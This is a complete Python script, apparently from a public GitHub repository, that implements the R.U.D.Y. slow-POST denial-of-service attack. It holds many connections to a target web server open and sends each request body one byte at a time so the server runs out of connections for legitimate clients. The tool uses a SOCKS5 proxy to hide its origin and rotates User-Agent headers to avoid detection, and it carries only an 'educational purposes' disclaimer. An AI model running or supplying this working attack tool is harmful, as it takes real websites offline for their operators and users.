#!/usr/bin/env python3


 ################################################################
#                                                                #
#  File: rudy.py                                                 #
#                                                                #
#  Author: Sergio Garcia Lopez                                   #
#                                                                #
#  Github: https://github.com/SergiDelta/rudy                    #
#                                                                #
#  Date: August 2021                                             #
#                                                                #
#  Version: 1.0                                                  #
#                                                                #
#  Description: Implementation of R.U.D.Y (Are you dead yet?)    #
#               Denial of Service attack in Python. It is a      #
#               "low and slow" attack which generates low        #
#               traffic in order to make each HTTP POST request  #
#               last around 10 minutes. It basically fills       #
#               a form but sends the body of the request byte    #
#               by byte, waiting several seconds after each      #
#               one. In this way, we simulate that we are a      #
#               client with very little bandwith. If we do this  #
#               distributedly, we may exhaust the available      # 
#               server connections, making it impossible for a   #
#               legitimate client to connect.                    #
#                                                                #
#  DISCLAIMER: Please, use this code for educational purposes    #
#              only. I am not responsible for any malicious use  #
#              that may be made of it.                           #
#                                                                #
 ################################################################


import socket
import socks 
import ssl
import argparse
import time
import random
import string
import urllib.parse
import sys


class Logger:
   def __init__(self, verbosity=False):
      self.verbose = verbosity

   def set_verbosity(self, verbosity):
      self.verbose = verbosity

   def log(self, message, file=sys.stdout):
      if self.verbose:
         print(message, file=file)

   def warn(self, message, file=sys.stderr):
      print(f"WARNING: {message}", file=file)

   def error(self, message, file=sys.stderr):
      print(f"ERROR: {message}", file=file)


def print_rudy():
   print("  ______   _   _  ______ _____  ___ ______  __   _______ _____ ___  ")
   print("  | ___ \ | | | | |  _  \  ___|/ _ \|  _  \ \ \ / /  ___|_   _|__ \ ")
   print("  | |_/ / | | | | | | | | |__ / /_\ \ | | |  \ V /| |__   | |    ) |")
   print("  |    /  | | | | | | | |  __||  _  | | | |   \ / |  __|  | |   / / ")
   print("  | |\ \  | |_| | | |/ /| |___| | | | |/ /    | | | |___  | |  |_|  ")
   print("  \_| \_|  \___/  |___/ \____/\_| |_/___/     \_/ \____/  \_/  (_)  ")
   print()
   print("            rudy 1.0 https://github.com/SergiDelta/rudy             ")
   print()


def init_socket(host, port, tls=False, timeout=5):
   sock = socks.socksocket()
   sock.settimeout(timeout)
   if tls:
      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
      ctx.load_default_certs()
      sock = ctx.wrap_socket(sock)
   sock.connect((host, port))

   return sock


def generate_http_req(method, path, headers, version="HTTP/1.1"):
   http_req = method + " " + path + " " + version + "\r\n"
   for head in headers:
      http_req += head + "\r\n"

   return http_req


def cli():
   parser = argparse.ArgumentParser(
      prog="rudy",
      description="%(prog)s 1.0 https://github.com/SergiDelta/rudy . " + 
      "Implementation of R.U.D.Y (Are you dead yet?) " + 
      "Denial of Service attack in Python."
   )
   parser.add_argument(
      "-s", "--sockets",
      default=150,
      type=int,
      help="Number of sockets (connections) to use. Default is 150."
   )
   parser.add_argument(
      "-t", "--time",
      default=10,
      type=int,
      help="Period of time in seconds that the program will wait " + 
      "before performing another round of byte sending. Default is 10."
   )
   parser.add_argument(
      "-l", "--length",
      default=64,
      type=int,
      help="Content-Length value (bytes) in HTTP POST request. Default is 64."
   )
   parser.add_argument(
      "-x", "--proxy",
      help="Send requests through a proxy, e.g: 127.0.0.1:8080"
   )
   parser.add_argument(
      "-v", "--verbose",
      action="store_true",
      help="Give details about actions being performed."
   )
   parser.add_argument(
      "--version",
      action="version",
      version="%(prog)s version 1.0 https://github.com/SergiDelta/rudy ."
   )
   parser.add_argument(
      "url",
      help='Absolute path to website, i.e [http[s]://]host[:port][file_path]'
   )

   return parser.parse_args()


def main():
   try:
      args = cli()
      url = urllib.parse.urlparse(args.url)
      host = url.netloc
      file_path = ""
      port = 80
      tls = False
      proxy = args.proxy
      logger = Logger(args.verbose)

      if url.scheme == "https":
         tls = True
         port = 443

      if url.scheme == "http" or url.scheme == "https":
         if host.find(":") != -1:
            port = int(host.split(":")[1])
            host = host.split(":")[0]
         file_path = url.path
      else:
         if host == "":
            host = args.url.split("/")[0]
         if host.find(":") != -1:
            port = int(host.split(":")[1])
            host = host.split(":")[0]
            file_path = url.path.split(str(port))[1] # fix urllib parsing
         else:
            host = url.path.split("/")[0]
            file_path = url.path.split(host)[1]

      if file_path == "":
         file_path = "/"

      if proxy:
         if proxy.find(":") == -1:
            logger.error("Invalid format for proxy address")
            sys.exit(1)
         else:
            try:
               proxy = proxy.split(":")
               proxy[1] = int(proxy[1])
               socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy[0], proxy[1], True)
            except:
               logger.error("Can not set default proxy to " + args.proxy)
               sys.exit(1)
         

      print_rudy()
      if proxy:
         print("Using proxy: " + args.proxy)
      socket_count = args.sockets
      round_time = args.time
      content_length = args.length

      list_of_sockets = []
      host_header = "Host: " + host
      user_agents = [
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
         "User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
         "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
      ]

      default_headers = [
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9," + 
         "*/*;q=0.8",
         "Accept-Encoding: *",
         "Accept-Language: en-US,en,q=0.5",
         "Connection: keep-alive",
         "Cache-Control: max-age=0"
      ]
      content_type_header = "Content-Type: application/x-www-form-urlencoded"
      content_length_header = "Content-Length: " + str(args.length)

      print("Attacking %s with %d sockets." % (host, socket_count))
      print("Creating sockets...") 

      for i in range(socket_count):
         try:
            logger.log("Creating socket number " + str(i+1))
            s = init_socket(host, port, tls)
            list_of_headers = []
            list_of_headers.append(host_header)
            list_of_headers.append(random.choice(user_agents))
            list_of_headers.extend(default_headers)
            list_of_headers.append(content_type_header)
            list_of_headers.append(content_length_header)
            http_request = generate_http_req("POST", file_path, list_of_headers)
            http_request += "\r\n"
            s.sendall(http_request.encode("utf-8"))
            if s:
               list_of_sockets.append(s)
         except socket.error:
            break

      while True:            
         print("Sending byte in HTTP POST body... Socket count: " + str(len(list_of_sockets)))
         for s in list(list_of_sockets):
            try:
               char = random.choice(string.digits + string.ascii_letters)
               s.send(char.encode("utf-8"))
            except socket.error:
               list_of_sockets.remove(s)

         for i in range(socket_count - len(list_of_sockets)):
            try:
               logger.log("Recreating socket...")
               s = init_socket(host, port, tls)
               list_of_headers = []
               list_of_headers.append(host_header)
               list_of_headers.append(random.choice(user_agents))
               list_of_headers.extend(default_headers)
               list_of_headers.append(content_type_header)
               list_of_headers.append(content_length_header)
               http_request = generate_http_req("POST", file_path, list_of_headers)
               http_request += "\r\n"
               s.sendall(http_request.encode("utf-8"))
               if s:
                  list_of_sockets.append(s)
            except socket.error:
               break

         time.sleep(round_time)
      
   except KeyboardInterrupt:
      print()


if __name__ == "__main__":
   main()


